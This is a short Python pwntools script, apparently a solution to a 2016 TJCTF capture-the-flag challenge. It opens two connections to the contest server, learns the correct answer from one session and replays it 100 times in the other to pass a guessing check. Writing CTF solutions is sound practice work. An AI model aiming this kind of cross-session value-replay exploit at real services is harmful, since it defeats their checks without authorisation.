#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# @Author: caleb
# @Date:   2016-05-27 23:31:58
# @Last Modified by:   caleb
# @Last Modified time: 2016-05-27 23:49:42
from pwn import *

URL = 'p.tjctf.org'
PORT = 8007

r1 = remote(URL, PORT)
r2 = remote(URL, PORT)

r1.recvuntil('\n')
r1.send('1\n')
r1.recvuntil('answer was ')
number = r1.recvuntil('\n').split('.')[0]

r2.recvuntil('\n')
for i in range(100):
	r2.send(number + '\n')
r2.interactive()